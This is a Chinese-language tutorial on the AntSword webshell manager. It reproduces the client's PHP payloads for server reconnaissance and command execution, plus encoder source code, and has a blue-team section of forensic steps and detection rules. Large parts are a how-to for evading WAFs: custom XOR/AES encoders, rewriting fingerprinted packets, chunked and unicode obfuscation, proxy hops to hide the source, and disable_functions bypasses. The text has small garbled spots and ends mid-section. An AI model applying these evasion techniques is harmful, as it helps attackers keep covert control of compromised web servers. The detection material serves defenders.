## 一、蚁剑是什么

蚁剑(AntSword)是一款开源、跨平台的WebShell管理工具，由中国安全社区开发，是经典工具"中国菜刀"的现代化替代。它主要用于在授权渗透测试中连接目标服务器上的WebShell，实现文件管理、命令执行、数据库操作等功能。

核心特点：

- 图形化界面，操作直观
- 支持PHP、ASP、ASPX、JSP、Custom等多种脚本语言
- 编码器/解码器机制灵活，可自定义加密通信
- 插件系统丰富，支持免杀、提权、内网渗透等扩展
- 开源可审计，社区活跃

- 开源地址：https://github.com/AntSwordProject/antSword
- 平台支持：Windows、Linux、macOS

## 二、与其他WebShell管理工具对比

| 维度 | 蚁剑(AntSword) | 菜刀(ChinaChopper) | 冰蝎(Behinder) | 哥斯拉(Godzilla) |
| --- | --- | --- | --- | --- |
| 开源 | 完全开源 | 闭源 | 部分开源 | 开源 |
| 语言支持 | PHP/ASP/ASPX/JSP/Custom | PHP/ASP/ASPX | PHP/ASP/ASPX/JSP | PHP/ASP/ASPX/JSP |
| 加密方式 | 自定义编码器(明文/Base64/chr/rot13/RSA/AES等) | 明文传输 | AES动态密钥加密 | AES+自定义加密器 |
| 流量隐蔽 | 依赖编码器配置，默认明文有特征 | 明文，特征明显 | 默认AES加密，隐蔽性好 | 默认加密，多加密器可选 |
| 插件系统 | 丰富(插件市场) | 无 | 有限 | 丰富 |
| 文件管理 | 支持 | 支持 | 支持 | 支持 |
| 虚拟终端 | 支持 | 有限 | 支持 | 支持 |
| 数据库管理 | 支持 | 有限 | 支持 | 支持 |
| 免杀能力 | 依赖编码器和shell定制 | 弱 | 中等(加密传输) | 强(动态加密+自定义) |
| 适用场景 | CTF/日常渗透/灵活定制 | 过时，不推荐 | WAF严格环境 | 高对抗环境 |

工具选择建议：

- CTF日常/快速操作/需要灵活定制：蚁剑，编码器可调，插件丰富
- WAF严格/流量检测环境：冰蝎或哥斯拉，默认加密通信
- 高对抗/需要强免杀：哥斯拉，多加密器+自定义能力强
- 菜刀已过时，不推荐使用

## 四、通信原理：蚁剑如何与WebShell交互

### 4.1 通信流程总览

```
蚁剑客户端                    目标服务器
    │                              │
    │  1. 构造Payload              │
    │  2. 编码器编码 ──────────────→ WebShell接收
    │  3. HTTP POST发送             │  3. 解码Payload
    │                               │  4. eval()执行代码
    │                               │  5. 输出缓冲捕获
    │  6. 接收响应  ←────────────── │  6. 编码结果+分隔标记返回
    │  7. 解码器解码                │
    │  8. 显示结果                  │
```

### 4.2 默认明文通信的请求体

蚁剑默认模式（不启用编码器）下，POST请求体直接包含可读的PHP代码。下面是一段**真实抓包样本**——连接成功后蚁剑自动发起的"获取基础信息"操作（用于探测目标环境）：

```php
@ini_set("display_errors", "0");        // 关闭错误回显，防止信息泄露
@set_time_limit(0);                      // 取消执行时间限制，长命令不被中断

function asenc($out){return $out;};      // 输出编码函数，默认不编码（明文返回）

function asoutput(){                     // 输出包装函数
    $output=ob_get_contents();           // 取出输出缓冲区内容
    ob_end_clean();                      // 清空缓冲
    echo "bccd1f"."c56209";              // 前缀分隔标记：bccd1fc56209
    echo @asenc($output);                // 输出（编码后的）执行结果
    echo "c0c0"."7d5c5";                 // 后缀分隔标记：c0c07d5c5
}

ob_start();                              // 开启输出缓冲
try{
    $D=dirname($_SERVER["SCRIPT_FILENAME"]);   // webshell所在目录
    if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);  // 兜底取目录
    $R="{$D}\t";
    if(substr($D,0,1)!="/"){             // Windows：枚举盘符
        foreach(range("C","Z")as $L)
            if(is_dir("{$L}:"))$R.="{$L}:";
    }else{                                // Linux：追加根分区
        $R.="/";
    }
    $R.="\t";
    // 获取当前用户：Linux用posix_getpwuid，否则get_current_user
    $u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
    $s=($u)?$u["name"]:@get_current_user();
    $R.=php_uname();                     // 系统信息（os/arch/hostname等）
    $R.="\t{$s}";
    echo $R;;                            // 输出：目录 \t 盘符 \t uname \t 用户
}catch(Exception $e){
    echo "ERROR://".$e->getMessage();
};
asoutput();                              // 包装输出
die();                                   // 终止脚本
```

URL编码后的POST body形如：

```
<参数名>=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3Bfunction+asenc...
```

请求体关键要素：

| 要素 | 含义 |
| --- | --- |
| `@ini_set("display_errors", "0")` | 关闭错误显示，防止暴露信息 |
| `@set_time_limit(0)` | 取消执行时间限制 |
| `asenc()` | 输出编码函数，默认直接返回原文（无编码） |
| `asoutput()` | 捕获输出缓冲，用分隔标记包裹后返回 |
| `bccd1f."c56209" / c0c0."7d5c5"` | 随机hex字符串分两段拼接成前/后缀分隔标记，用于客户端定位输出内容 |
| `dirname($_SERVER["SCRIPT_FILENAME"])` | 获取webshell所在目录（也是客户端默认打开目录） |
| `range("C","Z")` 枚举盘符 | 根据目录分隔符判断OS，Windows下一步步枚举盘符 |
| `posix_getpwuid/@posix_geteuid` | Linux下获取运行用户，否则退回 `get_current_user` |
| `php_uname()` | 拿到操作系统、架构、主机名等，用于选择后续payload类型 |

### 4.3 响应体格式

```
bccd1fc56209<执行结果>c0c07d5c5
```

- 前半段分隔标记(12位hex) + 实际输出 + 后半段分隔标记(11位hex)
- 客户端两侧用正则 `/bccd1fc56209(.*?)c0c07d5c5/s` 提取中间内容
- 这段样本的响应明文示例：

```
/var/www/html	C:D:	Linux target 5.4.0-generic... x86_64	www-data
```

字段顺序：`webshell目录 \t 盘符/根 \t uname \t 当前用户`，对应客户端连接后立即看到的"文件管理"默认目录与"虚拟终端"环境。

### 4.4 命令执行的多种回退路径

蚁剑虚拟终端的命令执行按优先级尝试多种方式（即之前你给出的webshell代码中的runcmd函数）：

1. system() — 直接执行并输出
2. passthru() — 直接执行并输出
3. shell_exec() — 返回输出字符串
4. exec() — 返回输出数组
5. popen() — 管道方式读取
6. proc_open() — 双管道（stdout+stderr）
7. antsystem() — 蚁剑自定义函数
8. Shellshock破壳漏洞利用（Linux+bash环境）
9. Windows COM对象（WScript.shell）

每种方式前都通过fe()函数检测：函数存在、可调用、不在disable_functions列表中。

### 4.5 实战：从抓包样本反推攻击者意图

蓝队/取证人员拿到一段蚁剑流量后，可按下列步骤快速定性：

```
步骤1：定位分隔标记
  请求体中找到 echo "xxxxxx"."yyyyy";  → 拼出前缀P1 + 后缀P2
  例：echo "bccd1f"."c56209";  → P1="bccd1fc56209"
      echo "c0c0"."7d5c5";     → P2="c0c07d5c5"

步骤2：剥出真实payload
  try{ ... } 块内的代码即本次请求的功能代码
  特点：无参数、无base64，使用$_SERVER["SCRIPT_FILENAME"]等服务器变量

步骤3：根据payload识别操作类型
  - 只读$_SERVER/posix_getpwuid/php_uname/range盘符  → "获取基础信息"(连接首包)
  - 出现$_POST[随机名]、base64_decode(substr())          → 命令执行(虚拟终端)
  - 出现readdir/opendir/chdir/chmod/file_get_contents   → 文件管理
  - 出现mysql_connect/mysqli_query/$_POST解码SQL        → 数据库管理

步骤4：定位webshell物理路径
  获取基础信息包会输出 dirname($_SERVER["SCRIPT_FILENAME"])
  即响应体 P1 与 P2 之间第一个 \t 前的部分 → webshell所在目录
  结合请求URL即可拼出完整文件路径，提交运维处置
```

例：上述样本响应体 `bccd1fc56209/var/www/html\tC:D:\tLinux srv01 5.4.0 x86_64\twww-datac0c07d5c5` 可直接得出：

- webshell 位于 `/var/www/html/`
- 目标是 Linux（无C:实际目录，仅尝试性输出，Linux下其实 ink `range C-Z` 仍会输出但 `is_dir` 失败仅为占位）

> 注：示例样本同时含 Windows 盘符枚举分支 `range("C","Z")`，这表明payload是按目录首字符 `substr($D,0,1)!="/"` 自动适配 OS。Linux下走 else 分支 `/`。该样本本身不能据此判断目标 OS，需看响应体实际返回内容。

## 九、编码器与解码器

编码器与解码器是蚁剑最核心的差异化能力，决定了流量特征和绕WAF能力。

### 9.1 概念区分

| 概念 | 作用方向 | 说明 |
| --- | --- | --- |
| 编码器(Encoder) | 请求方向（客户端→服务器） | 对发送的payload进行编码/加密 |
| 解码器(Decoder) | 响应方向（服务器→客户端） | 对返回的结果进行解码/解密 |

### 9.2 内置编码器

编码器位于 source/core/[脚本类型]/encoder/ 目录。

| 编码器 | 原理 | 流量特征 | 绕WAF能力 |
| --- | --- | --- | --- |
| default(UTF-8) | 明文传输 | 直接暴露eval、system等关键字 | 无 |
| base64 | Base64编码payload | body中有base64字符串，密码参数明文 | 弱，WAF可检测base64模式 |
| chr | chr()函数逐字符转换 | chr(112).chr(104)... 格式 | 中，规避字符串匹配但chr本身是高危函数 |
| chr16 | 16进制chr转换 | chr(0x70).chr(0x68)... 格式 | 中，同上 |
| rot13 | 字母位移替换 | 仅对字母变换，数字符号不变 | 弱，可逆性太强 |

### 9.3 内置解码器

解码器位于 source/core/[脚本类型]/decoder/ 目录。

| 解码器 | 说明 |
| --- | --- |
| default | 不解码，直接返回原文 |
| base64 | 对响应体base64解码 |
| rot13 | 对响应体rot13解码 |

### 9.4 编码器工作原理（以base64.js为例）

```javascript
// source/core/php/encoder/base64.js
module.exports = (pwd, data, ext = null) => {
  // 生成随机变量名（如果启用了随机变量选项）
  let randomID;
  if (ext.opts.otherConf['use-random-variable'] === 1) {
    randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
  } else {
    randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
  }

  // 将data['_']（要执行的代码）base64编码后存入随机变量
  data[randomID] = Buffer.from(data['_']).toString('base64');

  // 密码参数改为：eval(base64_decode($_POST['随机变量名']))
  data[pwd] = `@eval(@base64_decode($_POST['${randomID}']));`;

  // 删除原始data['_']，避免明文传输
  delete data['_'];
  return data;
};
```

通信过程：

```
编码前：POST body = cmd=<完整PHP代码明文>
编码后：POST body = cmd=@eval(@base64_decode($_POST['a3f2b1']));&a3f2b1=PEBpbmlfc2V0...
         ↑ 密码参数只含解码调用         ↑ 实际代码的base64编码
```

### 9.5 自定义编码器开发

步骤：

1. 在 source/core/php/encoder/ 目录下新建 .js 文件
2. 实现编码函数
3. 重启蚁剑，编码器自动出现在下拉列表中

示例：自定义XOR编码器

```javascript
// source/core/php/encoder/xor_custom.js
module.exports = (pwd, data, ext = null) => {
  let randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;

  // XOR加密
  let payload = data['_'];
  let key = 'mysecretkey';
  let encrypted = Buffer.alloc(payload.length);
  for (let i = 0; i < payload.length; i++) {
    encrypted[i] = payload.charCodeAt(i) ^ key.charCodeAt(i % key.length);
  }

  // 传输时用base64包装
  data[randomID] = encrypted.toString('base64');
  data[pwd] = `@eval(base64_decode($_POST['${randomID}'])^"${key}");`;
  delete data['_'];
  return data;
};
```

### 9.6 RSA编码器（高级）

## 十一、绕WAF实战

### 11.1 WAF检测蚁剑的维度

| 检测维度 | 检测内容 | 对应特征 |
| --- | --- | --- |
| 请求体关键字 | eval、system、exec、base64_decode等 | 默认模式下直接暴露 |
| 请求体模式 | base64字符串、chr()序列 | 编码器有固定模式 |
| 响应体格式 | 随机hex分隔标记+输出 | 前后分隔标记格式固定 |
| 请求参数名 | 固定参数名/0x开头参数 | 未开启随机变量时有规律 |
| 行为模式 | 高频POST请求、异常URL | 非正常业务流量 |

### 11.2 绕WAF策略

策略一：更换编码器

```
默认(明文) → 被WAF拦截
切换Base64 → 绕过关键字检测
切换chr → 绕过base64检测
切换rot13 → 绕过特定关键字过滤
```

策略二：启用随机变量名

```
连接配置 → 其他设置 → 勾选"使用随机变量名"
效果：POST参数名从固定值变为随机字符串
```

策略三：修改发包方式

```
默认POST → 被WAF拦截
切换为multipart/form-data → 绕过部分WAF
切换为分块传输(Chunked) → 绕过低性能WAF
```

策略四：修改流量特征

修改 source/core/php/index.js 中的核心模板代码：

```javascript
// 原始特征
@ini_set("display_errors", "0");
@set_time_limit(0);

// 修改为（去除WAF检测的标志性特征）
@error_reporting(0);
@set_time_limit(0);
```

修改分隔标记生成逻辑，避免固定的hex模式。

策略五：使用自定义编码器

```
内置编码器被WAF规则库覆盖 → 自定义编码器（AES/XOR/RSA）
即使WAF能检测base64/chr模式，也无法解密自定义加密
```

策略六：设置代理

```
连接配置 → 代理 → 设置SOCKS5/HTTP代理
通过多跳中继隐匿流量来源
```

策略七：消除"基础信息包"高识别度特征

蚁剑连接第一个请求（4.2节样本）流量特征最明显，常被WAF首屏拦截，必须优先处理：

| 易被WAF捕获的特征 | 处置方法 |
| --- | --- |
| `dirname($_SERVER["SCRIPT_FILENAME"])` 直接回显 webshell 路径 | 改用 `__DIR__` 等价的本地常量替换 `$_SERVER` |
| `foreach(range("C","Z"))` 盘符枚举模式 | 在自定义模板里删去盘符枚举段，或用 `glob("?:\\*")` 替代 |
| `posix_getpwuid(@posix_geteuid())` 固定组合 | 用 `getmyuid()`/`posix_geteuid()` 拆开成多变量拼接 |
| `php_uname()` 整串输出 | 用 `php_uname("s").php_uname("r")` 分步取，再拼接 |
| `asoutput()` 中 `echo "12hex"."11hex"` 双段拼接模式 | 自定义 encoder/decoder 改用单段或换字符集（如base36、8位随机小写字母） |

实操步骤：

```
1. 拷贝 source/core/php/index.js → 修改 default 模板的 asoutput 函数
   将   echo "<hex1>"."<hex2>";  改成  echo "<rand_alnum>";  (单段、或非hex字符)
   注意同步修改客户端解码逻辑（source/core/php/decoder/default.js）

2. 用编码器将 entire 请求 body 隐藏
   base64.js 模板仍会先把这段"默认信息包"明文 base64 一次，
   但内层 PHP 代码仍明文，深度检测WAF可解；
   → 终极方案：换 AES 编码器（自定义）或 RSA 编码器，
     全程高位加密，仅留 eval(base64_decode(...)) 一行可读入口

3. 修改分隔标记字符集
   默认 hex→ 易被特征库匹配；改为 base36 / 自定义字符集后分隔标记不可预测
```

策略八：分包与unicode混淆（针对语义WAF）

```
- 启用 multipart/form-data + 文件域伪装，让请求体跨boundary分散
- 关键字按 unicode 编码（如 \u0065val）发送，服务端用 \x40\u0065val 拼回
- 适用于支持AST解析的多层WAF
```

### 11.3 CTF实战绕WAF场景

场景：上传了一句话木马但蚁剑连接被WAF拦截

排查与解决：

```
1. 先用curl测试shell是否存活
   curl -X POST http://target.com/shell.php -d "cmd=phpinfo();"

2. 如果shell存活但蚁剑连不上，说明WAF拦截了蚁剑流量
   → 切换编码器为base64或chr
   → 勾选随机变量名
   → 切换发包方式为multipart

3. 如果仍然被拦截
   → 使用自定义编码器（AES/RSA加密）
   → 修改index.js中的流量特征字符串

4. 如果虚拟终端无输出
   → 检查disable_functions
   → 安装bypass_disable_functions插件
   → 尝试LD_PRELOAD等绕过模式
```

## 十二、流量特征分析与检测

### 12.1 各编码模式流量特征

Default(明文)模式：

```
请求体特征：
- @ini_set("display_errors", "0")
- @set_time_limit(0)
- eval($_POST[...])
- system/passthru/shell_exec等函数名

响应体特征：
- [随机hex前缀][输出内容][随机hex后缀]
- 前后缀各为5~7位hex字符串，分成两段用 `.` 拼接（如 `"bccd1f"."c56209"`）
- 总长偶有非对称：前11位/后11位或前12位/后11位，受random生成决定
```

Base64编码模式：

```
请求体特征：
- @eval(@base64_decode($_POST[...]))
- 一个参数值为base64编码字符串
- 密码参数名可能明文可见

响应体特征：
- 响应体为base64编码
- 可能包含%URL编码混淆
```

chr编码模式：

```
请求体特征：
- chr(112).chr(104).chr(112)形式
- 大量chr()函数调用和点号连接
- 请求体体积明显膨胀
```

RSA加密模式：

```
请求体特征：
- 密文长度固定（取决于RSA密钥长度，2048位=256字节）
- base64编码后的密文
- 无明文关键字

响应体特征：
- AES加密后的密文
- 无法直接解密（需要私钥）
```

### 12.2 通用检测规则

从防御角度，蚁剑流量的检测规则：

```
1. 请求体包含 `@ini_set("display_errors"` 且含 `set_time_limit(0)`
2. 请求体包含 `@eval(@base64_decode($_POST`
3. 请求体包含 `asenc` + `asoutput` 函数定义（无论明文/编码后内层）
4. 请求体包含大量 `chr().chr().chr()` 序列
5. 响应体匹配双段hex分隔：`[0-9a-f]{5,7}"\.".[0-9a-f]{5,7}`
6. 响应体含 `\t` 分隔多字段 + 双hex边界（基础信息包特征）
7. 同一URL高频POST请求且请求体远大于正常表单
8. POST参数名为纯hex字符串，长度12~14位（关闭随机变量名时仍易命中）
9. 请求体含 `ob_start` / `ob_get_contents` / `ob_end_clean` / `die()` 组合
10. 命令执行包含 `|||asline|||` / `|||askey|||` / `runcmd` 工具私有字符串
11. `dirname($_SERVER["SCRIPT_FILENAME"])` + `range("C","Z")` 同时出现
12. `posix_getpwuid(@posix_geteuid())` 固定函数组合
```

### 12.3 蚁剑通信包对照解读

实际测试中常抓到两类典型样本，对照分析能快速识别攻击阶段：

**样本A — 获取基础信息包（连接首包）**

```php
@ini_set("display_errors", "0");@set_time_limit(0);
function asenc($out){return $out;};
function asoutput(){
    $output=ob_get_contents();
    ob_end_clean();
    echo "bccd1f"."c56209";     // 前缀分隔标记 P1
    echo @asenc($output);
    echo "c0c0"."7d5c5";        // 后缀分隔标记 P2
}
ob_start();
try{
    $D=dirname($_SERVER["SCRIPT_FILENAME"]);
    if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);
    $R="{$D}\t";
    if(substr($D,0,1)!="/"){
        foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";  // Windows分支
    }else{
        $R.="/";                                                    // Linux分支
    }
    $R.="\t";
    $u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
    $s=($u)?$u["name"]:@get_current_user();
    $R.=php_uname();
    $R.="\t{$s}";
    echo $R;;
}catch(Exception $e){
    echo "ERROR://".$e->getMessage();
};
asoutput();die();
```

解读：

| 行 | 作用 | 流量告警价值 |
| --- | --- | --- |
| `@ini_set("display_errors","0")` | 关闭错误显示 | 高频关键字，可作 IDS 规则 |
| `@set_time_limit(0)` | 取消超时 | 同上 |
| `asenc(){return $out;}` | 默认明文（未加密），属低难度攻击者 | 配置可识别编码器档位 |
| `echo "bccd1f"."c56209"` & `echo "c0c0"."7d5c5"` | 双段拼接分隔标记，规避单串匹配 | 字符集固定为 `[0-9a-f]{6,7}`，可作正则 |
| `dirname($_SERVER["SCRIPT_FILENAME"])` | 获取 webshell 物理目录；为响应第一字段 | 取证中直接定位木马路径 |
| `range("C","Z")` 盘符枚举 | 适配 Windows 环境 | 一段独特死代码模式 |
| `posix_getpwuid/@posix_geteuid` | 获取 Linux 当前用户 | 失败时退回 `get_current_user` |
| `php_uname()` | 写入 OS / 架构 / 主机名 | 客户端据此选择 payload |

样本A 的响应可被还原为：

```
bccd1fc56209<webshell目录>\t<盘符或/>\t<uname串>\t<当前用户>c0c07d5c5
```

WAF/IDS 仅靠包特征即可命中：分隔标记 + `\t` 分隔的多字段模式非常稳定。

**样本B — 命令执行包（虚拟终端每次回车）**

```php
@ini_set("display_errors", "0");@set_time_limit(0);
function asenc($out){return $out;};
function asoutput(){ /* 同A样本 */ }
ob_start();
try{
    $p=base64_decode(substr($_POST["e882c48ed9f49c"],2));  // 解释器路径
    $s=base64_decode(substr($_POST["f0d95e1afc65bc"],2));  // 要执行的命令
    $envstr=@base64_decode(substr($_POST["c3af9d949b4ba4"],2)); // 环境变量

    $d=dirname($_SERVER["SCRIPT_FILENAME"]);
    $c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";   // sh -c / cmd /c

    if(substr($d,0,1)=="/"){
        @putenv("PATH=".getenv("PATH").":/usr/local/sbin:...");
    }else{
        @putenv("PATH=".getenv("PATH").";C:/Windows/system32;...");
    }
    if(!empty($envstr)){
        $envarr=explode("|||asline|||",$envstr);
        foreach($envarr as $v){
            if(!empty($v))@putenv(str_replace("|||askey|||","=",$v));
        }
    }
    $r="{$p} {$c}";
    $ret=@runcmd($r." 2>&1");        // 9 路 fallback：system/passthru/...
    print ($ret!=0)?"ret={$ret}":"";
}catch(Exception $e){
    echo "ERROR://".$e->getMessage();
};
asoutput();die();
```

解读：

- POST参数去掉前2字符后再 base64_decode（一层固定混淆，工具行为指纹）
- 自定义分隔符 `|||asline|||` 和 `|||askey|||` 用于环境变量键值还原（弱WAF盲点）
- `runcmd` 共9路 fallback：`system → passthru → shell_exec → exec → popen → proc_open → antsystem → Shellshock → Windows COM`
- 每路前用 `fe()` 探测 `function_exists && !in disable_functions`

两类样本对比：

| 维度 | 样本A 基础信息 | 样本B 命令执行 |
| --- | --- | --- |
| 触发时机 | 连接成功首包 | 每条命令/每个 cd |
| 参数使用 | 无 `$_POST` 业务参数（只读服务器变量） | 3 个 `$_POST[随机hex]` 业务参数 |
| 解码步骤 | 直接执行 | substr(2) → base64_decode |
| 输出字段 | `目录 \t 盘符 \t uname \t 用户` | 命令 stdout + 可选 `ret=N` |
| 大小（明文） | ~700字节 | ~1.5KB（含 runcmd 函数体） |
| 特征点 | `dirname/range/posix_getpwuid/php_uname` | `base64_decode/substr/putenv/runcmd` |

通用要点（适合直接做检测规则）：

- 分隔标记形如 `[0-9a-f]{6}\.".[0-9a-f]{5}` 与 `".[0-9a-f]{5}".` 双段字符串拼接，正则 `'[0-9a-f]{5,7}"\.".[0-9a-f]{5,7}'` 可命中
- 同时含 `ob_start` + `ob_get_contents` + `ob_end_clean` + `die()` 组合
- 明文模式下请求体含 `asenc` / `asoutput` 字符串（自定义命名后消失）
- POST 参数名长度约 12-14 位全 hex 且每次会变（开启"随机变量名"后特征消失，需配合行为分析）

## 十四、常见问题排查

### 14.1 连接失败

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 连接超时 | 网络不通/URL错误 | ping/curl测试目标可达性 |

### 14.2 虚拟终端无输出

```
排查步骤：
1. 执行 echo test，看是否有输出
2. 检查disable_functions：ini_get("disable_functions")
3. 如果system/exec等被禁用 → 安装bypass_disable_functions插件
4. 如果是Windows → 检查COM组件是否可用
5. 尝试直接在文件管理中上传反弹shell脚本
```

### 14.3 被WAF拦截

典型症状：客户端报 `取消连接` / `连接超时`，但 `curl -d "cmd=phpinfo();"` 正常拿到结果 → webshell 存活但蚁剑流量被拦。

最常见的拦切口：**连接首包"获取基础信息"包特征暴露最强**（见 12.3 样本A），WAF第一屏即拦。需优先处理该包：

```
首包专项绕过：
1. 删 / 改 asoutput() 分隔标记的双段拼接模式（参见 11.2 策略七）
2. 自定义编码器内联整个首包，避免裸 @ini_set / @set_time_limit
3. 改用 __DIR__ 替换 dirname($_SERVER["SCRIPT_FILENAME"])，去掉占位枚举range("C","Z")

逐步升级（一般场景）：
1. 切换编码器（default → Base64 → chr → rot13）
2. 勾选"使用随机变量名"
3. 切换发包方式（POST → multipart/form-data → Chunked）
4. 修改 source/core/php/index.js 中的核心模板流量特征字符串
5. 使用自定义编码器（AES/RSA加密），仅留 eval(base64_decode(...)) 一行入口
6. 设置 HTTP/SOCKS5 代理转发，隐藏来源
```

### 14.4 中文乱码

```
连接配置 → 编码 → 选择与目标一致的编码
- Linux通常UTF-8
- Windows中文系统可能GBK
- 修改后需重新连接
```

## 十五、速查表

### 连接配置速查

```
添加数据 → URL + 密码 + 类型 + 编码
PHP木马:  类型选PHP, 密码填$_POST的键名
Base64绕WAF: 编码器选Base64, 解码器选Base64
随机参数:  其他设置 → 勾选"使用随机变量名"
代理:     配置 → 代理 → HTTP/SOCKS5
```

### 编码器选择决策

```
无WAF         → default(明文)，最快最稳
初级WAF       → Base64编码器
关键字过滤WAF  → chr/chr16编码器
严格WAF       → 自定义编码器(AES/XOR/RSA)
流量审计环境   → RSA编码器
```

### 常用命令速查

```bash
# 信息收集

```
